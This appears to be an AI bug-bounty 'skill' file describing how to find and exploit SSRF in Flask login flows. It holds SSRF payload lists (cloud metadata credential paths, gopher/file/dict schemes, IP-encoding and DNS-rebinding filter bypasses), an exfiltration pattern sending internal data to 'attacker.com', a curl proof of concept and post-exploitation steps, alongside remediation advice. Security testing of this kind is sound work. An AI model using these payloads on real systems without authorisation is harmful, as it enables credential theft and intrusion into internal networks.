# 🌐 Flask Login Form – Server-Side Request Forgery (SSRF) – AI Bug Bounty Skill

## Skill Name
`flask-ssrf-login`

## Description
Detection and exploitation of Server-Side Request Forgery (SSRF) vulnerabilities originating from Python Flask login forms. This skill analyses how user-supplied URL parameters (redirect targets, OAuth callback URIs, identity provider endpoints, captcha service URLs, etc.) are processed by the server during authentication. It uncovers cases where the Flask application makes backend HTTP requests to attacker-controllable destinations, enabling access to internal services, cloud metadata exfiltration, or remote code execution via chained protocol handlers.

## Affected Components
- **Login form fields** that accept a URL as part of the authentication flow:
  - `next`, `redirect`, `redirect_uri`, `return_url`, `callback`, `continue`
  - `auth_provider_url`, `idp_metadata_url` (in SAML/OIDC flows)
  - `captcha_url`, `captcha_api` if the server fetches the captcha image from a user-provided URL
  - `avatar_url` or `profile_pic` (if login fetches avatar from external source)
- **OAuth2/OpenID Connect handshake**: The `redirect_uri` parameter used to fetch tokens or userinfo. If the server blindly follows redirections or validates the URI by making a request, SSRF can occur.
- **Single Sign-On (SSO) endpoints** that accept a `metadata_url` or `idp_cert_url` and fetch it without validation.
- **Password reset / magic link features**: Some flows allow setting a custom link that the server will later redirect to – if the server first checks the URL by issuing a HEAD/GET request, SSRF is possible.
- **Any backend library** used to make HTTP requests: `requests`, `urllib`, `httpx`, `aiohttp` – that uses unvalidated user input as the URL.
- **Flask routes** decorated with `@app.route('/login')` that internally call `requests.get(user_input_url)` or similar.

## Detection Patterns (Static & Dynamic)
### 1. URL Parameter Reflection in Server-Side Requests
- **Heuristic**: The login endpoint receives a parameter like `next` or `redirect` and the server-side code does something like:
  ```python
  import requests
  response = requests.get(request.args.get('next'))
  ```
  or validates the URL by attempting a connection.
- **Dynamic test**: Supply a URL to a collaborator or Burp Collaborator / webhook.site; if a DNS/HTTP request arrives, SSRF is confirmed.

### 2. Open Redirect Chaining
- If the login form has an open redirect and the application also has an internal request that follows redirects, an attacker can redirect the server to internal hosts.
- **Dynamic test**: Provide a URL like `http://evil.com/redirect?target=http://169.254.169.254/` – if the server follows the redirect chain, it may reach the metadata service.

### 3. OAuth `redirect_uri` Misconfiguration
- During OAuth code exchange, the server sends the authorization code to the redirect URI. If the server also fetches the redirect URI beforehand (e.g., to register the client), SSRF can occur.
- **Heuristic**: The `redirect_uri` is taken from user input and used in `requests.post(redirect_uri, data=...)`.

### 4. Service Endpoint Parameters
- For example, an SSO login that accepts the Identity Provider's `metadata_url`: `POST /login/saml?metadata_url=http://attacker.com/evil.xml`. The server fetches and parses the XML, potentially leading to SSRF + XML External Entity (XXE) combo.
- **Heuristic**: Parameters named `metadata_url`, `cert_url`, `idp_url`, `sso_url` that are fetched without allow-listing.

### 5. Captcha / External Verification
- Login form may include a captcha that is verified by fetching an external URL like `captcha_url=http://internal-service/validate`. If the URL is user-modifiable, SSRF arises.
- **Dynamic test**: Change `captcha_url` to internal addresses and observe response errors or time differences.

## Testing Methodology (AI Agent Steps)
1. **Enumerate URL-Accepting Parameters**
   - Examine all form fields (visible and hidden) and query parameters used during login.
   - Pay special attention to `redirect_uri`, `next`, `return`, `callback`, `state`, `nonce` (sometimes a URL), `idp_url`, `metadata`, `avatar`.
   - If the login page is multi-step (e.g., enter email → click magic link), check any step where a URL might be supplied.

2. **Inject Basic Probes**
   - **OOB detection**: `http://<your-collaborator>.burpcollaborator.net` – see if a DNS/HTTP request is received.
   - **Localhost probes**: `http://127.0.0.1/`, `http://localhost/`, `http://0.0.0.0/`.
   - **Internal service probes**: `http://192.168.0.1/`, `http://10.0.0.1/`, etc.
   - **Cloud metadata endpoints**:
     - AWS: `http://169.254.169.254/latest/meta-data/`
     - GCP: `http://metadata.google.internal/computeMetadata/v1/`
     - Azure: `http://169.254.169.254/metadata/instance?api-version=2021-02-01`
     - DigitalOcean: `http://169.254.169.254/metadata/v1/`
   - Observe response differences (status codes, error messages, timing) that indicate a request was made.

3. **Protocol Smuggling**
   - Try alternative schemes that the underlying library might support:
     - `file:///etc/passwd` (if `requests` is used, it does not support file, but `urllib` does)
     - `dict://localhost:11211/stat` (to query Memcached)
     - `gopher://localhost:25/_HELO%20...` (to interact with SMTP)
     - `ftp://attacker.com/` (to test FTP)
   - If the server uses `libcurl` (through pycurl), these schemes might be available.

4. **Port Scanning via Timing / Error Differences**
   - Probe `http://127.0.0.1:22`, `:3306`, `:6379`, `:8080`, etc.
   - Use response times to infer port status: a quick refusal vs. timeout.

5. **Blind SSRF Confirmation**
   - If no direct output, rely on OOB callbacks.
   - To extract data (e.g., metadata), use chained requests: `http://attacker.com/?x=<internal data>` or DNS exfiltration via subdomains (limited).

6. **Exploiting Internal Services**
   - If internal HTTP services are accessible, interact with administrative panels, databases (CouchDB, MongoDB), cloud metadata to steal credentials, or Redis/Memcached for RCE.
   - Example: AWS SSRF to IAM credentials:
     ```bash
     curl -X POST https://target.com/login -d "redirect_uri=http://169.254.169.254/latest/meta-data/iam/security-credentials/some-role"
     ```

7. **Bypassing Filters**
   - **IP restrictions**: Use decimal/octal encoding: `http://2130706433/` (for 127.0.0.1), `http://0177.0.0.1/`.
   - **DNS rebinding**: Use a domain that resolves to different IPs over time (e.g., `rbndr.us`).
   - **Redirect tricks**: Make your external server redirect to internal IPs (if the library follows redirects).
   - **URL parser confusion**: Double-encode, use `@` (e.g., `http://expected-domain@evil.com/`), backslashes.

## Essential Payloads (Flask Login SSRF)
### Cloud Metadata Retrieval
- AWS: `http://169.254.169.254/latest/meta-data/`
- AWS IAM credentials: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
- GCP: `http://metadata.google.internal/computeMetadata/v1/instance/?recursive=true` (requires header `Metadata-Flavor: Google`; if the server forwards custom headers, can be exploited)
- Azure: `http://169.254.169.254/metadata/instance?api-version=2021-02-01` (requires header `Metadata: true`)

### Internal Service Probing
- MySQL: `http://127.0.0.1:3306/` (will likely timeout but reveals port open if service banner?)
- Redis: `gopher://127.0.0.1:6379/_INFO` or HTTP to Redis port (it will respond with error)
- Elasticsearch: `http://localhost:9200/`
- Docker: `http://localhost:2375/containers/json`
- Kubernetes API: `http://10.0.0.1:443/` (sometimes)

### Protocol Handlers
- File read: `file:///etc/passwd` (if urllib is used)
- File read with cURL: `file:///app/config.py` (if pycurl)
- SSRF to itself (to access Flask debug console or admin): `http://localhost:5000/admin`

### URL Manipulation / Filter Bypass
- Decimal IP: `http://2130706433/` (127.0.0.1)
- Octal: `http://0177.0.0.1/`
- IPv6: `http://[::1]:80/`
- DNS rebinding domain: `http://7f000001.1d60e4c9c0a.svc.pvt/` (some services)
- Confusion with `@`: `http://trusted-domain@evil.com/` (parsed as evil.com by some libraries)
- Redirect chain: host a redirector at `http://attacker.com/redirect?url=http://169.254.169.254/`

## Post-Exploitation
- **Credential theft**: Access cloud instance metadata to obtain temporary security credentials.
- **Internal network pivot**: Scan and map internal services, exploit them (e.g., attack Jenkins, database servers).
- **Remote Code Execution**: Exploit vulnerable internal services (e.g., Redis RCE, Elasticsearch Groovy script RCE).
- **Data exfiltration**: Access internal file servers, code repositories.

## Secure Coding Recommendations
- **Validate and whitelist** all user-supplied URLs that the server will request. Use a strict list of allowed domains/IPs.
- **Disable support for dangerous URL schemes** in the HTTP library (block `file://`, `gopher://`, `dict://`, `ftp://`). Use a library that only supports http/https.
- **Never make requests to arbitrary user-supplied URLs**. If you must fetch a user profile image, download it in a sandboxed environment or use an intermediate proxy that restricts reachable networks.
- **Use network-level egress filtering**: Restrict outbound connections from the web server to only necessary external services.
- **For OAuth2 redirect_uri**, validate it against a pre-registered list; do not let users specify arbitrary URIs.
- **Avoid following redirects** when making server-side requests (or limit to a single hop). Disable auto-redirects in `requests` with `allow_redirects=False`.
- **Implement timeouts** to prevent server from hanging on slow internal services.
- **Monitor outgoing traffic** for anomalies (e.g., requests to metadata IPs).

## Output Format (Bug Report)
```
Title: Server-Side Request Forgery via Login Redirect Parameter
Severity: High/Critical (depends on accessible internal networks)
Endpoint: POST /login
Vulnerable Parameter: redirect_uri
Description:
  The login endpoint makes a server-side request to the value provided in the `redirect_uri` parameter without validation. This allows an attacker to access internal resources, including cloud instance metadata.
Proof of Concept:
  curl -X POST https://target.com/login -d "username=admin&password=wrong&redirect_uri=http://169.254.169.254/latest/meta-data/"
  Response contains AWS metadata.
Remediation:
  Whitelist allowed redirect URIs, disable server-side requests to user-provided URLs, and implement network segmentation.
```

## Skill Metadata
- **Author**: AI Bug Bounty Hunter
- **Version**: 1.0
- **Target Framework**: Flask (Python) with any HTTP client library
- **Testing Type**: Black-box / Grey-box (requires out-of-band callback server)
- **Dependencies**: None; AI can suggest payloads and interpret server behaviour.